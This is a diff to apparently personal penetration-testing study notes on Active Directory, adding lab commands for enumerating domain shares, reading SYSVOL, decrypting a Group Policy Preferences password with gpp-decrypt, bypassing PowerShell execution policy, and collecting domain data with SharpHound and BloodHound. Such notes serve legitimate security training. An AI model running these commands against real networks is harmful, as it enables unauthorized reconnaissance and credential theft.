@@ -2201,6 +2201,51 @@ Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
 ~~~
 
+```-CollectionMethods``` ```-CollectionMethod``` 차이 주의~~~
+
+### Enumerating Domain Shares
+
+#### Domain Share Query
+
+~~~ powershell
+PS C:\Tools> Find-DomainShare -CheckShareAccess
+~~~
+
+
+#### Listing contents of the SYSVOL share
+
+~~~ powershell
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
+~~~
+
+
+#### Using gpp-decrypt to decrypt the password
+
+~~~ powershell
+kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+P@$$w0rd
+~~~
+
+
+## Active Directory - Automated Enumeration
+
+### Collecting Data with SharpHound
+
+#### Importing the SharpHound script to memory
+
+~~~ powershell
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+~~~
+
+#### Running SharpHound to collect domain data
+
+~~~ powershell
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+~~~
+
+※ Caution about the difference between ```-CollectionMethod``` and ```-CollectionMethods```!
+
 
 #### Analysing Data using BloodHound
 
@@ -2211,8 +2256,11 @@ kali@kali:~$ sudo neo4j start
 
 #### Starting BloodHound in Kali Linux
 
+[https://github.com/SpecterOps/BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy)
+
 ~~~ bash
-kali@kali:~$ bloodhound
+chmod +x ./BloodHound
+./BloodHound --disable-gpu
 ~~~
 
 
